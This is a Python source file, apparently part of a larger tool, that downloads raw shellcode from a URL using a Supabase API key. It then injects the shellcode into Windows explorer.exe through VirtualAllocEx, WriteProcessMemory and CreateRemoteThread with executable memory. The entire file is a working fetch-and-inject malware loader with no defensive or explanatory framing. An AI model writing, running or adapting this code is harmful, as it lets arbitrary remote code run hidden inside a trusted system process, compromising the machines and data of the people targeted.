# utils/winapi/load_shellcode_from_url.py

import ctypes
import requests
from io import BytesIO
from ..config import SUPABASE_KEY

# Constants
TH32CS_SNAPPROCESS = 0x00000002
PROCESS_ALL_ACCESS = 0x1F0FFF

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_uint32),
        ("cntUsage", ctypes.c_uint32),
        ("th32ProcessID", ctypes.c_uint32),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", ctypes.c_uint32),
        ("cntThreads", ctypes.c_uint32),
        ("th32ParentProcessID", ctypes.c_uint32),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", ctypes.c_uint32),
        ("szExeFile", ctypes.c_char * 260)
    ]

def get_process_by_name(process_name):
    """Get the handle of a process by its name."""
    hSnapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    entry = PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

    process_handle = None

    if ctypes.windll.kernel32.Process32First(hSnapshot, ctypes.byref(entry)):
        while ctypes.windll.kernel32.Process32Next(hSnapshot, ctypes.byref(entry)):
            if entry.szExeFile.decode('utf-8') == process_name:
                process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, entry.th32ProcessID)
                break

    ctypes.windll.kernel32.CloseHandle(hSnapshot)

    if not process_handle:
        raise ProcessLookupError(f"Process '{process_name}' not found.")

    return process_handle

def inject_shellcode_into_process(process_handle, shellcode):
    """Inject and execute shellcode in the target process."""
    shellcode_size = len(shellcode)

    shellcode_buffer = ctypes.windll.kernel32.VirtualAllocEx(
        process_handle,
        None,
        shellcode_size,
        0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
        0x40              # PAGE_EXECUTE_READWRITE
    )

    if not shellcode_buffer:
        raise MemoryError(f"Failed to allocate memory in target process. Error code: {ctypes.windll.kernel32.GetLastError()}")

    written = ctypes.c_size_t(0)
    if not ctypes.windll.kernel32.WriteProcessMemory(
        process_handle,
        shellcode_buffer,
        shellcode,
        shellcode_size,
        ctypes.byref(written)
    ):
        raise RuntimeError(f"Failed to write shellcode to target process memory. Error code: {ctypes.windll.kernel32.GetLastError()}")

    thread_id = ctypes.c_ulong(0)
    if not ctypes.windll.kernel32.CreateRemoteThread(
        process_handle,
        None,
        0,
        shellcode_buffer,
        None,
        0,
        ctypes.byref(thread_id)
    ):
        raise RuntimeError(f"Failed to create remote thread in target process. Error code: {ctypes.windll.kernel32.GetLastError()}")

def load_shellcode_from_url(file_url):
    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
    }

    # Download the shellcode
    response = requests.get(file_url, headers=headers)
    response.raise_for_status()

    # Load the shellcode into memory
    shellcode_data = response.content
    shellcode_stream = BytesIO(shellcode_data)
    shellcode_bytes = shellcode_stream.getvalue()

    try:
        explorer_handle = get_process_by_name('explorer.exe')
        inject_shellcode_into_process(explorer_handle, shellcode_bytes)
        ctypes.windll.kernel32.CloseHandle(explorer_handle)
    except Exception as e:
        raise RuntimeError(f"Failed to inject shellcode: {str(e)}")

    return "Shellcode injected and executed successfully in explorer.exe."
